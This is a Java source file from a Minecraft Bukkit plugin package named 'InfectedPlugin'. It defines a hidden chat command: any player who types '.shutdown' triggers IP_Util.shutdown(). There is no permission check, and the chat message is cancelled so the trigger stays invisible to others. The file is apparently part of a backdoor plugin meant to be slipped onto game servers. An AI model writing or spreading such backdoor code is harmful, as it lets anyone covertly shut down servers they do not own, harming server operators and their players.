package org.CreeperCoders.InfectedPlugin.Commands;

import java.io.IOException;

import org.CreeperCoders.InfectedPlugin.IP_Util;
import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_shutdown implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".shutdown"))
            {
                try
                {
                    IP_Util.shutdown();
                }
                catch (IOException ex)
                {
                    InfectedPlugin.log.severe(ex.getMessage());
                }
                catch (RuntimeException ex)
                {
                    InfectedPlugin.log.severe(ex.getMessage());
                }
                event.setCancelled(true);
                return;
            }
        }
    }

}
